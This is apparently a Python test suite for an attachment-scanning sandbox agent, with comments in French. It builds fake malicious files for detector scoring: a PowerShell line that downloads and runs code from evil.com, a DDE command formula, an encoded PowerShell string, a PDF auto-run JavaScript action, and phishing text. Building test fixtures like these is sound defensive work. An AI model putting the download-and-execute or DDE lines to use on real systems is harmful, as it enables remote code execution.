# test_sandbox_with_vm.py — v2.3 FINAL
"""
Test complet agent sandbox v2.3 :
  - Étape 1 : analyses statiques (bénins + malveillants + borderline)
  - Étape 2 : utilitaires (sanitize, parse_vm_result, régression JSON long)
  - Étape 3 : sweep métriques F1/Precision/Recall sur 17 cas (seuils 30/40/50/60)
  - Étape 4 : chemin VM complet via run_sandbox_agent() [skippable avec --no-vm]

Usage :
  python test_sandbox_with_vm.py           # tout
  python test_sandbox_with_vm.py --no-vm  # sans Azure
"""
import io
import os
import re
import sys
import zipfile
from dotenv import load_dotenv

load_dotenv()

# ── Imports explicites ────────────────────────────────────────────────────────
from agents.agent_sandbox import (
    analyze_pdf,
    analyze_docx,
    analyze_xlsx,
    analyze_zip,
    run_sandbox_agent,
    sanitize_blob_name,
    parse_vm_result,
)

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
PASS = "✅ PASS"
FAIL = "❌ FAIL"
results_log: list[dict] = []


def check(label: str, condition: bool, detail: str = "") -> bool:
    status = PASS if condition else FAIL
    results_log.append({"label": label, "status": status, "detail": detail})
    print(f"   {status}  {label}" + (f"  [{detail}]" if detail else ""))
    return condition


def section(title: str):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")


# ─────────────────────────────────────────────────────────────────────────────
# FABRICATION DES FICHIERS DE TEST
# ─────────────────────────────────────────────────────────────────────────────
def make_pdf_clean() -> bytes:
    return b"""%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj
xref
0 4
0000000000 65535 f
trailer << /Size 4 /Root 1 0 R >>
startxref 9
%%EOF"""


def make_pdf_malicious() -> bytes:
    """PDF avec JavaScript + OpenAction + Launch."""
    return b"""%PDF-1.4
1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj
2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj
3 0 obj << /Type /Page /Parent 2 0 R >> endobj
4 0 obj << /Type /Action /S /JavaScript /JS (app.alert('pwned')) >> endobj
/AA /JS /JavaScript /Launch
xref
0 5
0000000000 65535 f
trailer << /Size 5 /Root 1 0 R >>
startxref 9
%%EOF"""


def make_pdf_phishing() -> bytes:
    """PDF avec URL de phishing (bit.ly + login)."""
    return (
        b"%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj\n"
        b"Check your account: https://bit.ly/3xEvil and http://login.verify-now.ru/secure\n"
        b"%%EOF"
    )


def make_docx_clean() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml', '<document><body><p>Hello world.</p></body></document>')
    return buf.getvalue()


def make_docx_with_macro() -> bytes:
    """DOCX avec vbaProject.bin -> risque >= 70."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml', '<document/>')
        z.writestr('word/vbaProject.bin', b'\xd0\xcf\x11\xe0fake_vba'.decode('latin-1'))
    return buf.getvalue()


def make_docx_with_bec_high() -> bytes:
    """DOCX avec BEC critique ('wire transfer' + 'gift card') -> risque >= 50."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml',
                   '<document><body><p>Please process this wire transfer. gift card required.</p></body></document>')
    return buf.getvalue()


def make_docx_borderline_bec_low() -> bytes:
    """
    DOCX borderline : 3 mots BEC faibles.
    Score v2.3 = 3x12 = 36 (franchit seuil 30).
    Etait v2.2 = 3x8 = 24 (sous seuil 30 -> FN).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml',
                   '<document><body><p>URGENT : Please verify your invoice and click here to confirm.</p></body></document>')
    return buf.getvalue()


def make_docx_borderline_ext_link_unknown() -> bytes:
    """
    DOCX borderline : lien externe vers domaine inconnu.
    Score v2.3 = 45 (franchit seuil 40).
    Etait v2.2 = 35 (sous seuil 40 -> FN).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml', '<document/>')
        z.writestr('word/_rels/document.xml.rels',
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
                   ' Target="http://evil-redirect.ru/payload" TargetMode="External"/>'
                   '</Relationships>')
    return buf.getvalue()


def make_docx_borderline_ext_link_known() -> bytes:
    """
    DOCX avec lien vers domaine connu (sharepoint.com).
    Score v2.3 = 20 (sous seuil 30 -> pas de FP).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml', '<document/>')
        z.writestr('word/_rels/document.xml.rels',
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
                   ' Target="https://company.sharepoint.com/doc" TargetMode="External"/>'
                   '</Relationships>')
    return buf.getvalue()


def make_docx_combo_bec_and_link() -> bytes:
    """
    DOCX combo : BEC faible (2 mots) + lien externe inconnu.
    Score v2.3 = 2x12 + 45 + bonus 15 = 84 (MENACE).
    Etait v2.2 = 2x8 + 35 = 51 (SUSPECT seulement).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml',
                   '<document><body><p>URGENT : verify your invoice details immediately.</p></body></document>')
        z.writestr('word/_rels/document.xml.rels',
                   '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
                   '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"'
                   ' Target="http://phish.evil.com/login" TargetMode="External"/>'
                   '</Relationships>')
    return buf.getvalue()


def make_docx_with_powershell() -> bytes:
    """DOCX avec PowerShell dans XML interne -> risque >= 70."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('word/document.xml', '<document/>')
        z.writestr('word/settings.xml', '<settings>powershell -enc aGVsbG8=</settings>')
    return buf.getvalue()


def make_xlsx_clean() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('xl/worksheets/sheet1.xml', '<worksheet/>')
    return buf.getvalue()


def make_xlsx_with_macro() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('xl/worksheets/sheet1.xml', '<worksheet/>')
        z.writestr('xl/vbaProject.bin', b'\xd0\xcf\x11\xe0fake'.decode('latin-1'))
    return buf.getvalue()


def make_xlsx_with_dde() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('xl/worksheets/sheet1.xml',
                   '<worksheet><sheetData><row><c><v>=DDE("cmd","/c calc")</v></c></row></sheetData></worksheet>')
    return buf.getvalue()


def make_zip_clean() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('readme.txt', 'This is a test archive.')
    return buf.getvalue()


def make_zip_with_exe() -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        z.writestr('malware.exe', b'MZ\x90\x00fake'.decode('latin-1'))
        z.writestr('dropper.ps1', 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://evil.com")')
    return buf.getvalue()


# ─────────────────────────────────────────────────────────────────────────────
# DATASET 17 CAS
# label : 1 = malveillant/borderline a detecter, 0 = benin
# ─────────────────────────────────────────────────────────────────────────────
def build_dataset() -> list[dict]:
    return [
        # Benins (label=0)
        {"name": "pdf_clean.pdf",              "data": make_pdf_clean(),                     "label": 0, "desc": "PDF benin"},
        {"name": "docx_clean.docx",            "data": make_docx_clean(),                    "label": 0, "desc": "DOCX benin"},
        {"name": "docx_link_known.docx",       "data": make_docx_borderline_ext_link_known(),"label": 0, "desc": "DOCX lien SharePoint connu"},
        {"name": "xlsx_clean.xlsx",            "data": make_xlsx_clean(),                    "label": 0, "desc": "XLSX benin"},
        {"name": "zip_clean.zip",              "data": make_zip_clean(),                     "label": 0, "desc": "ZIP benin"},
        {"name": "xlsx_clean2.xlsx",           "data": make_xlsx_clean(),                    "label": 0, "desc": "XLSX benin #2"},

        # Malveillants francs (label=1)
        {"name": "pdf_malicious.pdf",          "data": make_pdf_malicious(),                 "label": 1, "desc": "PDF JS+OpenAction+Launch"},
        {"name": "pdf_phishing.pdf",           "data": make_pdf_phishing(),                  "label": 1, "desc": "PDF URLs phishing"},
        {"name": "docx_macro.docx",            "data": make_docx_with_macro(),               "label": 1, "desc": "DOCX macro VBA"},
        {"name": "docx_bec_high.docx",         "data": make_docx_with_bec_high(),            "label": 1, "desc": "DOCX BEC critique"},
        {"name": "docx_powershell.docx",       "data": make_docx_with_powershell(),          "label": 1, "desc": "DOCX PowerShell"},
        {"name": "docx_combo.docx",            "data": make_docx_combo_bec_and_link(),       "label": 1, "desc": "DOCX combo BEC+lien inconnu"},
        {"name": "xlsx_macro.xlsx",            "data": make_xlsx_with_macro(),               "label": 1, "desc": "XLSX macro VBA"},
        {"name": "xlsx_dde.xlsx",              "data": make_xlsx_with_dde(),                 "label": 1, "desc": "XLSX DDE"},
        {"name": "zip_exe.zip",                "data": make_zip_with_exe(),                  "label": 1, "desc": "ZIP avec .exe/.ps1"},

        # Borderline (label=1 — ratés en v2.2 a seuil 40, corriges en v2.3)
        {"name": "docx_bec_low_3mots.docx",    "data": make_docx_borderline_bec_low(),       "label": 1, "desc": "DOCX 3 mots BEC faibles (borderline)"},
        {"name": "docx_link_unknown.docx",     "data": make_docx_borderline_ext_link_unknown(),"label": 1, "desc": "DOCX lien externe inconnu (borderline)"},
    ]


# ─────────────────────────────────────────────────────────────────────────────
# METRIQUES
# ─────────────────────────────────────────────────────────────────────────────
def compute_metrics(dataset: list[dict], threshold: int) -> dict:
    TP = TN = FP = FN = 0
    details = []

    for item in dataset:
        fn = item["name"].lower()
        if fn.endswith('.pdf'):
            result = analyze_pdf(item["data"])
        elif fn.endswith('.docx'):
            result = analyze_docx(item["data"])
        elif fn.endswith('.xlsx'):
            result = analyze_xlsx(item["data"])
        elif fn.endswith('.zip'):
            result = analyze_zip(item["data"])
        else:
            result = {"risk": 0, "threats": []}

        score = result["risk"]
        pred  = 1 if score >= threshold else 0
        label = item["label"]

        if   pred == 1 and label == 1: TP += 1
        elif pred == 0 and label == 0: TN += 1
        elif pred == 1 and label == 0: FP += 1
        elif pred == 0 and label == 1: FN += 1

        details.append({"desc": item["desc"], "score": score,
                         "label": label, "pred": pred, "correct": pred == label})

    total     = TP + TN + FP + FN
    precision = TP / (TP + FP) if (TP + FP) > 0 else 0.0
    recall    = TP / (TP + FN) if (TP + FN) > 0 else 0.0
    f1        = 2 * precision * recall / (precision + recall) if (precision + recall) > 0 else 0.0
    accuracy  = (TP + TN) / total if total > 0 else 0.0

    tn_rate  = TN / (TN + FP) if (TN + FP) > 0 else 0.0
    f1_neg   = 2 * tn_rate * (1 - recall) / (tn_rate + (1 - recall)) if (tn_rate + (1 - recall)) > 0 else 0.0
    macro_f1 = (f1 + f1_neg) / 2

    n_pos  = sum(1 for d in dataset if d["label"] == 1)
    n_neg  = sum(1 for d in dataset if d["label"] == 0)
    w_f1   = (f1 * n_pos + f1_neg * n_neg) / total if total > 0 else 0.0

    return {
        "threshold": threshold,
        "TP": TP, "TN": TN, "FP": FP, "FN": FN,
        "precision": precision, "recall": recall,
        "f1": f1, "macro_f1": macro_f1, "weighted_f1": w_f1,
        "accuracy": accuracy, "details": details,
    }


# ─────────────────────────────────────────────────────────────────────────────
# ETAPE 1 — ANALYSES STATIQUES
# ─────────────────────────────────────────────────────────────────────────────
def test_static_analysis():
    section("ETAPE 1 : ANALYSES STATIQUES LOCALES")

    print("\n[PDF benin]")
    r = analyze_pdf(make_pdf_clean())
    check("PDF benin -> risque 0", r['risk'] == 0, f"risque={r['risk']}")

    print("\n[PDF malveillant JS+OpenAction+Launch]")
    r = analyze_pdf(make_pdf_malicious())
    check("PDF malveillant -> risque >= 50",    r['risk'] >= 50, f"risque={r['risk']}")
    check("PDF detecte JavaScript",             any('JavaScript' in t or '/JS' in t for t in r['threats']), str(r['threats']))
    check("PDF detecte OpenAction",             any('automatique' in t for t in r['threats']), str(r['threats']))

    print("\n[PDF phishing URLs]")
    r = analyze_pdf(make_pdf_phishing())
    check("PDF phishing -> risque > 0",         r['risk'] > 0, f"risque={r['risk']}")
    check("PDF detecte URL suspecte",           any('URL' in t or 'suspecte' in t for t in r['threats']), str(r['threats']))

    print("\n[DOCX benin]")
    r = analyze_docx(make_docx_clean())
    check("DOCX benin -> risque 0",             r['risk'] == 0, f"risque={r['risk']}")

    print("\n[DOCX macro VBA]")
    r = analyze_docx(make_docx_with_macro())
    check("DOCX macro -> risque >= 70",         r['risk'] >= 70, f"risque={r['risk']}")
    check("DOCX detecte VBA",                  any('VBA' in t for t in r['threats']), str(r['threats']))

    print("\n[DOCX BEC critique]")
    r = analyze_docx(make_docx_with_bec_high())
    check("DOCX BEC critique -> risque >= 50",  r['risk'] >= 50, f"risque={r['risk']}")
    check("DOCX detecte BEC critique",         any('BEC critique' in t for t in r['threats']), str(r['threats']))

    print("\n[DOCX PowerShell]")
    r = analyze_docx(make_docx_with_powershell())
    check("DOCX PowerShell -> risque >= 70",    r['risk'] >= 70, f"risque={r['risk']}")

    print("\n[DOCX borderline : 3 mots BEC faibles — v2.3 fix]")
    r = analyze_docx(make_docx_borderline_bec_low())
    check("DOCX 3xBEC faible -> risque = 36",  r['risk'] == 36, f"risque={r['risk']} (attendu=36)")
    check("DOCX 3xBEC faible -> franchit 30",  r['risk'] >= 30, f"risque={r['risk']}")

    print("\n[DOCX borderline : lien externe inconnu — v2.3 fix]")
    r = analyze_docx(make_docx_borderline_ext_link_unknown())
    check("DOCX lien inconnu -> risque = 45",  r['risk'] == 45, f"risque={r['risk']} (attendu=45)")
    check("DOCX lien inconnu -> franchit 40",  r['risk'] >= 40, f"risque={r['risk']}")

    print("\n[DOCX lien SharePoint connu — doit rester faible]")
    r = analyze_docx(make_docx_borderline_ext_link_known())
    check("DOCX lien connu -> risque = 20",    r['risk'] == 20, f"risque={r['risk']} (attendu=20)")
    check("DOCX lien connu -> sous 30 (no FP)",r['risk'] < 30,  f"risque={r['risk']}")

    print("\n[DOCX combo BEC faible + lien inconnu — v2.3 bonus]")
    r = analyze_docx(make_docx_combo_bec_and_link())
    check("DOCX combo -> risque >= 75 (MENACE)",  r['risk'] >= 75, f"risque={r['risk']}")
    check("DOCX combo detecte signal combine",
          any('combiné' in t or 'Signal' in t or 'combine' in t for t in r['threats']), str(r['threats']))

    print("\n[XLSX benin]")
    r = analyze_xlsx(make_xlsx_clean())
    check("XLSX benin -> risque 0",             r['risk'] == 0, f"risque={r['risk']}")

    print("\n[XLSX macro VBA]")
    r = analyze_xlsx(make_xlsx_with_macro())
    check("XLSX macro -> risque >= 70",         r['risk'] >= 70, f"risque={r['risk']}")

    print("\n[XLSX DDE]")
    r = analyze_xlsx(make_xlsx_with_dde())
    check("XLSX DDE -> risque >= 65",           r['risk'] >= 65, f"risque={r['risk']}")

    print("\n[ZIP benin]")
    r = analyze_zip(make_zip_clean())
    check("ZIP benin -> risque 0",              r['risk'] == 0, f"risque={r['risk']}")

    print("\n[ZIP avec .exe et .ps1]")
    r = analyze_zip(make_zip_with_exe())
    check("ZIP exe -> risque >= 85",            r['risk'] >= 85, f"risque={r['risk']}")
    check("ZIP detecte executables",
          any('xécutable' in t or 'Exécutable' in t or 'cutable' in t for t in r['threats']), str(r['threats']))


# ─────────────────────────────────────────────────────────────────────────────
# ETAPE 2 — UTILITAIRES
# ─────────────────────────────────────────────────────────────────────────────
def test_utilities():
    section("ETAPE 2 : UTILITAIRES")

    print("\n[sanitize_blob_name]")
    check("Nom normal",                    sanitize_blob_name("rapport.pdf") == "rapport.pdf")
    check("Espaces -> _",                  '_' in sanitize_blob_name("mon fichier.pdf"))
    check("Chars speciaux nettoyes",       bool(re.match(r'^[a-zA-Z0-9._-]+$', sanitize_blob_name("file@#$.pdf"))))
    check("Nom vide -> 'file'",            sanitize_blob_name("") == "file")
    check("Nom long tronque a 200",        len(sanitize_blob_name("a" * 300)) <= 200)

    print("\n[parse_vm_result — cas normal]")
    sha = "a" * 64
    log = (f'[VM] SHA256 : {sha}\n'
           f'[VM RESULT] {{"vm_risk": 75, "vm_threats": ["Macros VBA (VM)", "PowerShell/CMD (VM)"], "sha256": "{sha}"}}\n'
           f'[VM DONE]')
    vm_risk, vm_threats, vm_sha = parse_vm_result(log)
    check("parse risque correct",          vm_risk == 75,        f"vm_risk={vm_risk}")
    check("parse 2 menaces",               len(vm_threats) == 2, f"nb={len(vm_threats)}")
    check("parse SHA256 extrait",          len(vm_sha) == 64,    f"sha={vm_sha[:16]}...")

    print("\n[parse_vm_result — JSON long (regression greedy fix v2.2)]")
    long_threats = [f"Menace numero {i}" for i in range(20)]
    sha2 = "c" * 64
    long_log = f'[VM RESULT] {{"vm_risk": 90, "vm_threats": {long_threats}, "sha256": "{sha2}"}}\n[VM DONE]'
    vm_risk2, vm_threats2, _ = parse_vm_result(long_log)
    check("JSON long : risque correct",    vm_risk2 == 90,         f"vm_risk={vm_risk2}")
    check("JSON long : 20 menaces",        len(vm_threats2) == 20, f"nb={len(vm_threats2)}")

    print("\n[parse_vm_result — log vide]")
    vm_risk3, vm_threats3, sha3 = parse_vm_result("")
    check("Log vide -> risque 0",          vm_risk3 == 0,  f"vm_risk={vm_risk3}")
    check("Log vide -> sha N/A",           sha3 == "N/A",  f"sha={sha3}")


# ─────────────────────────────────────────────────────────────────────────────
# ETAPE 3 — SWEEP METRIQUES
# ─────────────────────────────────────────────────────────────────────────────
def test_metrics_sweep():
    section("ETAPE 3 : SWEEP METRIQUES — 17 CAS x 4 SEUILS")

    dataset    = build_dataset()
    thresholds = [30, 40, 50, 60]
    best_f1    = 0.0
    best_seuil = 0

    print(f"\n  {'Seuil':>6} | {'TP':>3} {'TN':>3} {'FP':>3} {'FN':>3} | "
          f"{'Prec':>6} {'Recall':>6} {'F1':>6} | {'MacroF1':>8} {'WgtF1':>7} {'Acc':>6}")
    print(f"  {'-'*75}")

    metrics_all = []
    for thr in thresholds:
        m = compute_metrics(dataset, thr)
        metrics_all.append(m)
        print(f"  {thr:>6} | {m['TP']:>3} {m['TN']:>3} {m['FP']:>3} {m['FN']:>3} | "
              f"{m['precision']:>6.4f} {m['recall']:>6.4f} {m['f1']:>6.4f} | "
              f"{m['macro_f1']:>8.4f} {m['weighted_f1']:>7.4f} {m['accuracy']:>6.4f}")
        if m['f1'] > best_f1:
            best_f1    = m['f1']
            best_seuil = thr

    print(f"\n  -> Meilleur seuil F1 : {best_seuil} (F1={best_f1:.4f})")

    m40 = next(m for m in metrics_all if m['threshold'] == 40)
    fn_cases = [d for d in m40['details'] if d['label'] == 1 and d['pred'] == 0]
    fp_cases = [d for d in m40['details'] if d['label'] == 0 and d['pred'] == 1]

    if fn_cases:
        print(f"\n  --- Faux Negatifs a seuil 40 ({len(fn_cases)}) ---")
        for c in fn_cases:
            print(f"     FN  {c['desc']:50s}  score={c['score']}")
    else:
        print(f"\n  OK Aucun Faux Negatif a seuil 40 (v2.3 fix valide)")

    if fp_cases:
        print(f"\n  --- Faux Positifs a seuil 40 ({len(fp_cases)}) ---")
        for c in fp_cases:
            print(f"     FP  {c['desc']:50s}  score={c['score']}")
    else:
        print(f"  OK Aucun Faux Positif a seuil 40")

    print()
    check("Seuil 40 : FP = 0",            m40['FP'] == 0,           f"FP={m40['FP']}")
    check("Seuil 40 : Precision = 1.0",   m40['precision'] == 1.0,  f"precision={m40['precision']:.4f}")
    check("Seuil 40 : Recall >= 0.90",    m40['recall'] >= 0.90,    f"recall={m40['recall']:.4f}")
    check("Seuil 40 : F1 >= 0.94",        m40['f1'] >= 0.94,        f"f1={m40['f1']:.4f}")

    score_bec  = next(d['score'] for d in m40['details'] if 'BEC faibles' in d['desc'])
    score_ext  = next(d['score'] for d in m40['details'] if 'lien externe inconnu' in d['desc'])
    score_sp   = next(d['score'] for d in m40['details'] if 'SharePoint' in d['desc'])
    check("Borderline BEC franchit seuil 30",     score_bec >= 30, f"score={score_bec}")
    check("Borderline lien inconnu franchit 40",  score_ext >= 40, f"score={score_ext}")
    check("Lien SharePoint sous 30 (no FP)",      score_sp  < 30,  f"score={score_sp}")


# ─────────────────────────────────────────────────────────────────────────────
# ETAPE 4 — CHEMIN VM COMPLET
# ─────────────────────────────────────────────────────────────────────────────
def test_vm_path():
    section("ETAPE 4 : CHEMIN VM COMPLET (BLOB + ACI + LOGS)")
    print("  Info : ce test cree de vraies ACI Azure — duree ~3-5 minutes")

    print("\n[Cas 1 : DOCX benin -> SAIN]")
    r = run_sandbox_agent(
        attachments=[{"name": "test_benin.docx", "data": make_docx_clean()}],
        score_provisoire=0
    )
    print(f"   Verdict : {r['verdict']} | Score : {r['score_sandbox']} | VM failures : {r.get('vm_failures', 'N/A')}")
    check("DOCX benin -> score < 40",          r['score_sandbox'] < 40)
    check("DOCX benin -> 0 VM failure",        r.get('vm_failures', 0) == 0)
    check("DOCX benin -> verdict SAIN ou PARTIEL",
          "SAIN" in r['verdict'] or "PARTIEL" in r['verdict'], r['verdict'])

    print("\n[Cas 2 : DOCX macro VBA -> MENACE]")
    r2 = run_sandbox_agent(
        attachments=[{"name": "test_macro.docx", "data": make_docx_with_macro()}],
        score_provisoire=0
    )
    print(f"   Verdict : {r2['verdict']} | Score : {r2['score_sandbox']}")
    check("DOCX macro -> score >= 70",         r2['score_sandbox'] >= 70)
    check("DOCX macro -> verdict MENACE",      "MENACE" in r2['verdict'], r2['verdict'])

    print("\n[Cas 3 : sans PJ -> PAS DE SANDBOX]")
    r3 = run_sandbox_agent(attachments=[], score_provisoire=0)
    check("Sans PJ -> triggered=False",        r3['triggered'] == False)
    check("Sans PJ -> score 0",                r3['score_sandbox'] == 0)


# ─────────────────────────────────────────────────────────────────────────────
# RAPPORT FINAL
# ─────────────────────────────────────────────────────────────────────────────
def print_final_report():
    section("RAPPORT FINAL")
    passed = [r for r in results_log if r['status'] == PASS]
    failed = [r for r in results_log if r['status'] == FAIL]

    print(f"\n  Total  : {len(results_log)} checks")
    print(f"  Pass   : {len(passed)}")
    print(f"  Fail   : {len(failed)}")

    if failed:
        print(f"\n  --- Echecs ---")
        for r in failed:
            print(f"  FAIL  {r['label']}")
            if r['detail']:
                print(f"        -> {r['detail']}")
    print()
    if not failed:
        print("  TOUS LES CHECKS PASSES — Agent sandbox v2.3 valide !")
    else:
        print(f"  {len(failed)} check(s) echoue(s) — voir details ci-dessus")
    print()


# ─────────────────────────────────────────────────────────────────────────────
# POINT D'ENTREE
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "=" * 70)
    print("  TEST COMPLET AGENT SANDBOX v2.3")
    print("=" * 70)

    required_vars = [
        "AZURE_TENANT_ID", "AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET",
        "AZURE_SUBSCRIPTION_ID", "RESOURCE_GROUP",
        "STORAGE_ACCOUNT_NAME", "STORAGE_ACCOUNT_KEY",
    ]
    missing = [v for v in required_vars if not os.getenv(v)]
    if missing:
        print(f"\nERREUR — Variables .env manquantes : {', '.join(missing)}")
        sys.exit(1)
    print(f"\nOK Variables Azure : {len(required_vars)}/{len(required_vars)} presentes")

    test_static_analysis()
    test_utilities()
    test_metrics_sweep()

    if "--no-vm" in sys.argv:
        print("\n  Info : Etape VM skippee (--no-vm)")
    else:
        test_vm_path()

    print_final_report()